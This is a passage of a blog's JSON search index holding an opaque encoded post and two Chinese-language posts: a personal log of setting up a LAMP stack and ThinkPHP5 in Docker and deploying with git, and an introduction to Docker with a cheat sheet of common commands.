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\n\n","thumbnail":"https://i.loli.net/2019/04/06/5ca8768ebab89.jpg","plink":"https://Directoree.github.io/post/ancientcityoftaierzhaung/"},{"title":"闲谈Docker😄","date":"2019-04-01T09:41:10.000Z","updated":"2019-04-14T16:14:28.699Z","content":"闲谈一下Docker….\n\n一. ( ´･･)ﾉ(._.`)一有好些时日没有更新了，但这并不意味着我没学习😭，很喜欢学习技术方面的东西😒。嗯，真好玩，原来学习这些东西是真的好玩。比如说学些SQL注入的小东西，无论是手工亦或是借助一些工具。XSS玩玩也挺不错的，还有就是隐写逼格好高哦…..内网渗透可真是无孔不入….等等….我都觉得挺有意思。\n但是无奈(  ᵒ̴̶̷̥́ _ᵒ̴̶̷̣̥̀  )，就目前来说没有这么多时间去搞这些了😔…..\n但是，我是绝对不会停下脚步滴。今天复习到下午就开始有些无聊了，难道？嗯，是的，我的课程设计还没搞好呢，正好可以转移注意力去搞搞项目(๑╹︎ڡ╹︎๑)⃛，也好放松一下,毕竟Docker和ThinkPHP5还没学完呢，那就开始搞吧…..\n二曾经听说过这样一句话：一项技术兴起并有可能占有重要地位时，我们应该尽早去学习掌握它，因为早开始就意味着早成才。无论学什么都应该始终保持一颗对求知充满欲望的心，我比较喜欢电影《功夫熊猫2》里的一句台词：Your story may not have a such happy begining, but that doesn’t make who you are. It is the rest of your story, who you choose to be. （你人生故事的开头也许充满坎坷，不过这并不影响你成为什么样的人。关键看你后来的人生路，你自己选择怎么走下去。）\n我一直都对那些存有高度自律能力的人充满敬仰，对大多数成年人来说惰性始终是一生之敌。我也时常在思考一个问题，一个人做一件事做多久才能称得上坚持？现在我也终于明白，原来被叫做坚持的这种东西它本身是不具有方向性的或者说它对于每个不同的人来说都有特殊的意义，只要认为是值得就坚持得有意义。\n所以我得出这样一个结论：一定要找到一个理由来支撑坚持，无论是一个目标还是心中强大的欲望。因为放弃太简单了，一个简单的想法就可以让自己放弃。这个理由也有可能是一生所求吧….\n三好了，扯淡也差不多了。还是回来再看看最近遇到的问题，也好写个总结，方便以后自己再次查阅能够方便些。\n\n二. Docker、Github文件部署2.1 关于我的Docker一、Web服务器已经完成的工作截至2019.4.1号，我在docker里装了一个ubuntu，ubuntu里搭了一个Web服务器（Apache2+mysql+php7.2）。\n结构：ubuntu18.04（1）│├─ ubuntu18.04（2）│    ├─ apache2│    ├─ mysql│    ├─ php7.2\napache2对外目录/var/www/html\n\ndocker ps -a （已经将apache280端口映射到ubuntu18.04（1）的90端口）列出\n\n\n\n\nCONTAINER ID\nIMAGE\nCOMMAND\nCREATED\nSTATUS\nPORTS\nNAMES\n\n\n\n\n7b8832c95393\n0517335286ae\n“/bin/bash”\n9 days ago\nExited (0) 3 hours ago\n\nwebtest\n\n\n83a664e24ae4\nubuntu\n“/bin/bash”\n10 days ago\nExited (0) 9 days ago\n\nubuntu-web\n\n\n\n\ndocker start -i 7b8832c95393 进入ubuntu，ls，cat uplogs\n\n\n在主目录下建立了service.sh脚本，目的是启动apache2和mysql服务器；一定要给脚本文足够的权限，否则脚本运行不了。\n在主目录下建立了uplogs.txt文件，目的是记录容器的更新；\n在 /var/www/html建立test1.php文件，内容为：\n\n     &lt;?php\n      echo phpinfo();\n     ?>\n\n   但是在客户机浏览器看到显示为空，上网查了一下，需要修改PHP配置，如下：   vim /etc/php/7.2/apache2/php.ini   修改PHP配置信息将short_open_tags=on；   参考链接： https://www.cnblogs.com/smallrookie/p/5635814.html \n二、将建立好的容器转为镜像并部署到 Dockerhub\n\n容器转成镜像\ndock kill &lt;containerID&gt; 停止要转换的容器；\ndocker commit -a &quot;Alvin-Web&quot; -m &quot;my webserver&quot; 83a664e24ae4 apachemysql/php7.2:v1.2\n-a 是取作者名字\n-m 是给这个镜像取一个名字\n83a664e24ae4 容器ID\napache/php7.2 镜像仓库名\n:v1.0 镜像的tag是v1.0完整命令docker commit -a &quot;xxxx&quot; -m &quot;xxx&quot; &lt;containerID&gt;  镜像仓库名xx:tag名x\n\n\n\n\n将转换好的镜像部署到Dockerhub\n在Dockerhub建立一个Repositories。我的是webservice-apache2-mysql-php7.2，我的用户名是treecat，则全名是treecat/webservice-apache2-mysql-php7.2\ndocker login 登陆远程仓库\n将本地要部署的镜像仓库名必须改为和远程webservice-apache2-mysql-php7.2一样 ----&gt;docker tag apachemysql/php7.2:v1.2 treecat/webservice-apache2-mysql-php7.2:v1.2\n部署 docker push treecat/webservice-apache2-mysql-php7.2:v1.2\n\n\n\n\n三、准备在ubuntu18.04（2）里装ThinkPHP5\n注意：安装ThinkPHP5只需要在Apache2或者其他服务器的根目录下放tp5这个文件夹就好了。特别需要注意的是，我在win10系统然后进入ThinkPHP官网下载的文件拿到Ubuntu下面来用老是不行，按照跨平台性和理论性来说无论在哪一个系统下面都能用。下面做了些探索，但是最后的解决方法是：在Ubuntu系统下到官网下载ThinkPHP5.0.24完整版，然后用Docker命令将本地文件复制到容器里面，注意我这里没有复制到镜像，命令参考：\ndocker cp 本地文件的路径（绝对路径） 容器ID:容器中存放该文件的路径位置   \ndocker cp /opt/etc/lampp/htdocs/tp5 7862sc25dsc1:/var/www/html/ \n\n 实际方法参考上述即可，下面是我初期安装ThinkPHP5的探索，也是可以安装的，如果不想麻烦可略过….\n\n本来想的挺好的在里面装个ThinkPHP5就直接用了，无奈composer.phar都已经安装好了，但是如下的错误始终无法解决： \n\nroot@7b8832c95393:/var/www/html# sudo composer create-project topthink/thinkphp tp5\nbash: sudo: command not found\n\nroot@7b8832c95393:/var/www/html# composer create-project topthink/thinkphp tp5\nDo not run Composer as root/super user! See https://getcomposer.org/root for details\n\ndocker里面的ubuntu不能用sudo因为自身就是root了，我不想建立用户组，管理有些麻烦；\n\n第二个问题就是Do not run Composer as root/super user! See https://getcomposer.org/root for details，根据报错知道不能直接用root或者超级用户，网上找了些方法都是建立用户组的用户就好了。但是后来没办法我确实建立了一个用户组和一个用户，然后本以为这样就可以了，然后我就去安装TP5了，没想到报错说是没有cache….算了，是在没时间去搞这些花里胡哨的了。\n我仔细一想不就是在/war/www/html下装个ThinkPHP5么，而且它本身就是文件夹和文件。简单啊，我先将这个文件夹放到我的Github，然后直接用ubuntu18.04（2）从我的github仓库git clone就好了呀….说干就干。无奈如果直接在github仓库直接Upload files的话，每次上传的文件个数有要求，所以我就想到了用Git啊，命令行直接干上去….又是说干就干，不过成功了！（本地文件部署到Github）哈哈哈，往下看我是怎么将本地文件上传到我的Github仓库的，之前只是部署博客倒是挺溜的，这次终于有机会上传文件玩玩了….\n但是，但是，但是就这样把自己的tp5放到ubuntu18.04（2）的/var/www/html下面的话，使用localhost/tp5/public根本访问不了，我知道依赖和配置这些都没弄好，实在不想自己再去搞了，直接去github下载人家官方维护的不好么？真的是傻….教程参考[如何使用Git安装ThinkPHP5]这下就在ubuntu18.04（1）---&gt;docker--->ubuntu18.04（2）--->/car/www/html下装好了thinkphp5.1装好后访问 localhost:90/think_git/public/index.php 是这样滴…..\n\n\n2.2 将本地文件部署到Github一. 建立本地仓库\n\n\n准备本地仓库\ngit init\ngit add .\ngit commit -m &quot;注释内容&quot;\n\n\n\n建立需要部署的文件夹或者准备好需要部署的文件夹（作为本地仓库）；\n在文件夹里面执行git init初始化本地仓库，初始化成功后你会发现项目里多了一个隐藏文件夹.git；\n执行指令git add .将所有文件添加到仓库；（注意空格和点不要忘了）这时可以使用命令git status查询文件有哪些修改了（修改的文件显示为红色）\n执行指令git commit -m &quot;注释内容&quot;双引号内是提交注释（不要忘记双引号）。\n\n二. 建立远程仓库并部署\n\n\n准备远程仓库\ngit remote add origin git@github.com:Directoree/thinkphp5.git\ngit pull --rebase origin master\ngit push -u origin master\n\n\n\n建立好远程仓库，注意需要有README.md文件；\n关联本地和远程仓库：git remote add origin git@github.com:Directoree/thinkphp5.git\n将远程README.md文件拉到本地仓库来，git pull --rebase origin master\n将本地文件部署到远程仓库：git push -u origin master\n\n完成(●’◡’●)\n\n\n三. ThinkPHP5.0和ThinkPHP5.1的文件结构目录结构初始的目录结构有些不一样如下：\n1. thinphp5.0结构\nproject  应用部署目录\n├─application           应用目录（可设置）\n│  ├─common             公共模块目录（可更改）\n│  ├─index              模块目录(可更改)\n│  │  ├─config.php      模块配置文件\n│  │  ├─common.php      模块函数文件\n│  │  ├─controller      控制器目录\n│  │  ├─model           模型目录\n│  │  ├─view            视图目录\n│  │  └─ ...            更多类库目录\n│  ├─command.php        命令行工具配置文件\n│  ├─common.php         应用公共（函数）文件\n│  ├─config.php         应用（公共）配置文件\n│  ├─database.php       数据库配置文件\n│  ├─tags.php           应用行为扩展定义文件\n│  └─route.php          路由配置文件\n├─extend                扩展类库目录（可定义）\n├─public                WEB 部署目录（对外访问目录）\n│  ├─static             静态资源存放目录(css,js,image)\n│  ├─index.php          应用入口文件\n│  ├─router.php         快速测试文件\n│  └─.htaccess          用于 apache 的重写\n├─runtime               应用的运行时目录（可写，可设置）\n├─vendor                第三方类库目录（Composer）\n├─thinkphp              框架系统目录\n│  ├─lang               语言包目录\n│  ├─library            框架核心类库目录\n│  │  ├─think           Think 类库包目录\n│  │  └─traits          系统 Traits 目录\n│  ├─tpl                系统模板目录\n│  ├─.htaccess          用于 apache 的重写\n│  ├─.travis.yml        CI 定义文件\n│  ├─base.php           基础定义文件\n│  ├─composer.json      composer 定义文件\n│  ├─console.php        控制台入口文件\n│  ├─convention.php     惯例配置文件\n│  ├─helper.php         助手函数文件（可选）\n│  ├─LICENSE.txt        授权说明文件\n│  ├─phpunit.xml        单元测试配置文件\n│  ├─README.md          README 文件\n│  └─start.php          框架引导文件\n├─build.php             自动生成定义文件（参考）\n├─composer.json         composer 定义文件\n├─LICENSE.txt           授权说明文件\n├─README.md             README 文件\n├─think                 命令行入口文件\n\n\n2. thinphp5.1结构\n├─application           应用目录\n│  ├─common             公共模块目录（可以更改）\n│  ├─module_name        模块目录\n│  │  ├─config.php      模块配置文件\n│  │  ├─common.php      模块函数文件\n│  │  ├─controller      控制器目录\n│  │  ├─model           模型目录\n│  │  ├─view            视图目录\n│  │  └─ ...            更多类库目录\n│  │\n│  ├─command.php        命令行工具配置文件\n│  ├─common.php         公共函数文件\n│  ├─config.php         公共配置文件\n│  ├─route.php          路由配置文件\n│  ├─tags.php           应用行为扩展定义文件\n│  └─database.php       数据库配置文件\n│\n├─public                WEB目录（对外访问目录）\n│  ├─index.php          入口文件\n│  ├─router.php         快速测试文件\n│  └─.htaccess          用于apache的重写\n│\n├─thinkphp              框架系统目录\n│  ├─lang               语言文件目录\n│  ├─library            框架类库目录\n│  │  ├─think           Think类库包目录\n│  │  └─traits          系统Trait目录\n│  │\n│  ├─tpl                系统模板目录\n│  ├─base.php           基础定义文件\n│  ├─console.php        控制台入口文件\n│  ├─convention.php     框架惯例配置文件\n│  ├─helper.php         助手函数文件\n│  ├─phpunit.xml        phpunit配置文件\n│  └─start.php          框架入口文件\n│\n├─extend                扩展类库目录\n├─runtime               应用的运行时目录（可写，可定制）\n├─vendor                第三方类库目录（Composer依赖库）\n├─build.php             自动生成定义文件（参考）\n├─composer.json         composer 定义文件\n├─LICENSE.txt           授权说明文件\n├─README.md             README 文件\n├─think                 命令行入口文件\n\n\nrouter.php用于php自带webserver支持，可用于快速测试 切换到public目录后，启动命令：php -S localhost:8888 router.php 上面的目录结构和名称是可以改变的，这取决于你的入口文件和配置参数。\n\n命名规范\n\n","thumbnail":"https://i.loli.net/2019/02/27/5c75f47d51065.jpg","plink":"https://Directoree.github.io/post/docker-github/"},{"title":"Docker","date":"2019-03-25T11:36:11.000Z","updated":"2019-03-29T16:32:27.893Z","content":"项目需要，我也来学学Docker和ThinkPHP5…学习需要时间和精力，早开始早熟练…..(｡◕︎‿◕︎)ﾉﾟ･ﾟ･\n\n\nDocker \n\n\n\n一. Docker初识\n\n关于Docker\n\n为什么要使用Docker？\nDocker和虚拟机(virtual machine)有什么区别？\n什么是Docker？\n\n\n\n一、 为什么要使用Docker？\n环境配置的难题\n软件开发最大的麻烦事之一，就是环境配置。用户计算机的环境都不相同，你怎么知道自家的软件，能在那些机器跑起来？\n用户必须保证两件事：操作系统的设置，各种库和组件的安装。只有它们都正确，软件才能运行。举例来说，安装一个 Python 应用，计算机必须有 Python 引擎，还必须有各种依赖，可能还要配置环境变量。\n如果某些老旧的模块与当前环境不兼容，那就麻烦了。开发者常常会说：“它在我的机器可以跑了”（It works on my machine），言下之意就是，其他机器很可能跑不了。\n环境配置如此麻烦，换一台机器，就要重来一次，旷日费时。很多人想到，能不能从根本上解决问题，软件可以带环境安装？也就是说，安装的时候，把原始环境一模一样地复制过来。\n\n二、 Docker和虚拟机(virtual machine)有什么区别？\n1. 虚拟机\n虚拟机（virtual machine）就是带环境安装的一种解决方案。它可以在一种操作系统里面运行另一种操作系统，比如在 Windows 系统里面运行 Linux 系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。虽然用户可以通过虚拟机还原软件的原始环境。但是，这个方案有几个缺点。\n（1）资源占用多\n虚拟机会独占一部分内存和硬盘空间。它运行的时候，其他程序就不能使用这些资源了。哪怕虚拟机里面的应用程序，真正使用的内存只有 1MB，虚拟机依然需要几百 MB 的内存才能运行。\n（2）冗余步骤多\n虚拟机是完整的操作系统，一些系统级别的操作步骤，往往无法跳过，比如用户登录。\n（3）启动慢\n启动操作系统需要多久，启动虚拟机就需要多久。可能要等几分钟，应用程序才能真正运行。\n\n2. Linux 容器\n由于虚拟机存在这些缺点，Linux 发展出了另一种虚拟化技术：Linux 容器（Linux Containers，缩写为 LXC）。Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。或者说，在正常进程的外面套了一个保护层。对于容器里面的进程来说，它接触到的各种资源都是虚拟的，从而实现与底层系统的隔离。由于容器是进程级别的，相比虚拟机有很多优势。\n（1）启动快\n容器里面的应用，直接就是底层系统的一个进程，而不是虚拟机内部的进程。所以，启动容器相当于启动本机的一个进程，而不是启动一个操作系统，速度就快很多。\n（2）资源占用少\n容器只占用需要的资源，不占用那些没有用到的资源；虚拟机由于是完整的操作系统，不可避免要占用所有资源。另外，多个容器可以共享资源，虚拟机都是独享资源。\n（3）体积小\n容器只要包含用到的组件即可，而虚拟机是整个操作系统的打包，所以容器文件比虚拟机文件要小很多。总之，容器有点像轻量级的虚拟机，能够提供虚拟化的环境，但是成本开销小得多。\n\n三、 什么是Docker？\nDocker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。\nDocker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker，就不用担心环境问题。\n总体来说，Docker 的接口相当简单，用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。\n\n四、Docker 的用途\nDocker 的主要用途，目前有三大类。\n（1）提供一次性的环境。比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。（2）提供弹性的云服务。因为 Docker 容器可以随开随关，很适合动态扩容和缩容。（3）组建微服务架构。通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。\n\n二. Docker架构\n\nDocker是CS架构，Docker 的核心组件包括：\n\n\nDocker客户端 （Client）：通过docker在host上构建和运行容器\n\nDocker服务器（Docker daemon）：是服务器组件，以 Linux 后台服务的方式运行。 运行在宿主机上，Docker守护进程，用户通过Docker client(Docker命令CLI)与Docker daemon交互。\n\nDocker镜像 （Image）：通过它可以创建 Docker 容器。镜像是只读的，镜像中包含有需要运行的文件。镜像用来创建container，一个镜像可以运行多个container；镜像可以通过Dockerfile创建，也可以从Docker hub/registry上下载。\n\nDocker容器（Container）：容器是Docker的运行组件，启动一个镜像就是一个容器，容器是一个隔离环境，多个容器之间不会相互影响，保证容器中的程序运行在一个相对安全的环境中。\n\nDocker hub/Registry：注册服务器，用于管理多个镜像仓库（Repository），起到的是服务器的作用。\n\nRepository：镜像仓库，用于存储具体的docker镜像，起到的是仓库存储作用。\n\n\n\nRegistry和Repository的关系：\n\n\n架构扩充知识：\n\n\n最核心的是 Docker Daemon我们称之为Docker守护进程，也就是Server端，Server端可以部署在远程，也可以部署在本地，因为Server端与客户端(Docker Client)是通过Rest API进行通信。\ndocker CLI 实现容器和镜像的管理，为用户提供统一的操作界面,这个 客户端提供一个只读的镜像，然后通过镜像可以创建一个或者多个容器(container)，这些容器可以只是一个RFS(Root File System),也可以是一个包含了用户应用的RFS。容器在docker Client中只是一个进程，两个进程是互不可见的。\n用户不能与server直接交互，但可以通过与容器这个桥梁来交互，由于是操作系统级别的虚拟技术，中间的损耗几乎可以不计\n\nCLI：command line interface 命令行接口.\nRFS：Root File System 根文件系统.\n\n\n三.  Docker常用命令\n3.1 镜像管理docker images                 ------ 列出本地所有镜像\ndocker search &lt;IMAGE_ID/NAME> ------ 查找image\ndocker pull &lt;IMAGE_ID>        ------ 下载image\ndocker push &lt;IMAGE_ID>        ------ 上传image\ndocker rmi &lt;IMAGE_ID>         ------ 删除image\n\n\n3.2 容器管理docker run -i -t &lt;IMAGE_ID> /bin/bash\n-i            ------ 标准输入给容器    \n-t            ------ 分配一个虚拟终端   \n/bin/bash     ------ 执行bash脚本\n-d            ------ 以守护进程方式运行（后台）\n-P            ------ 默认匹配docker容器的5000端口号到宿主机的49153 to 65535端口\n-p &lt;HOT_PORT>:&lt;CONTAINER_PORT>\n              ------ 指定端口号,前者为映射端口，后者为容器端口\n--name        ------ 指定容器的名称，方便区别\n--rm          ------ 退出时删除容器\n--------------------------------------------------------------------------------\ndocker stop &lt;CONTAINER_ID>  \n              ------ 等待运行结束并停止container\ndocker kill &lt;CONTAINER_ID>  \n              ------ 强制停止container\ndocker start &lt;CONTAINER_ID> -i /bin/bash\n              ------ 重新启动container       \n--------------------------------------------------------------------------------         \ndocker ps     ------ 显示正在运行过的容器\n-l            ------ 显示最后启动的容器\n-a            ------ 显示所有容器\n--------------------------------------------------------------------------------\ndocker attach &lt;CONTAINER_ID> ------ 连接到启动的容器\ndocker logs &lt;CONTAINER_ID>   ------ 输出容器日志\n-f                           ------ 实时输出\ndocker cp &lt;CONTAINER_ID>:path hostpath\n                             ------ 复制容器内的文件到宿主机目录上\ndocker rm &lt;CONTAINER_ID>     ------ 删除container\ndocker rm `docker ps -a -q`  ------ 删除所有容器\ndocker kill `docker ps -q`\ndocker rmi `docker images -q 